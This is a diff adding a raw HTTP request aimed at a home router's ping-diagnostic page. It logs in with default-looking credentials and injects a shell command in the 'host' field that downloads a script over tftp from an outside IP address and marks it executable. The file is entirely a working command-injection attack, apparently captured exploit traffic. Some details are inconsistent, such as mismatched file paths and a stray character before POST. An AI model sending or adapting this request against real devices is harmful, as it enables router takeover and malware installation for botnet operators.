@@ -1,0 +1,16 @@
+uPOST /cgi?2 HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain
+Content-Length: 1000
+Origin: http://192.168.1.1
+DNT: 1
+Connection: close
+Referer: http://192.168.1.1/mainFrame.htm
+Cookie: Authorization=Basic YWrtaW46YWRtaW4=
+
+[IPPING_DIAG#0,0,0,0,0,0#0,0,0,0,0,0]0,6&dataBlockSize=64&timeout=1&numberOfRepetitions=4&host=$(echo 127.0.0.1; tftp -g -r tshit.sh -l /var/tmp/shell 194.85.248.176; chmod 777 /var/tmp/tshit.sh)&X_TP_ConnName=ewan_ipoe_d&diagnosticsState=Requested
+
